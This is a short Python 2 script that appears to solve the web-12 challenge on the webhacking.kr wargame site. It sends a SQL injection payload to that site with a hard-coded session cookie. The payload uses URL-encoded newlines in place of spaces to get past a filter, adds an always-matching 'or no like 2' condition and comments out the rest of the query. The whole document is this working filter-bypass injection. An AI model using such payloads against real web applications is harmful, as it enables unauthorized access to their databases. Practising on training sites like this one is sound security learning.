import requests

url='http://webhacking.kr/challenge/web/web-12/index.php?no='
cookies={'PHPSESSID':'tcnd4nfftq0qirc4raig3a2150'}
get_param="-1)%0aor%0ano%0alike%0a2%0a--%20"#3)%0aor%0ano%0alike%0a2%0a
url=url+get_param
print url
response=requests.post(url,cookies=cookies)
print response.text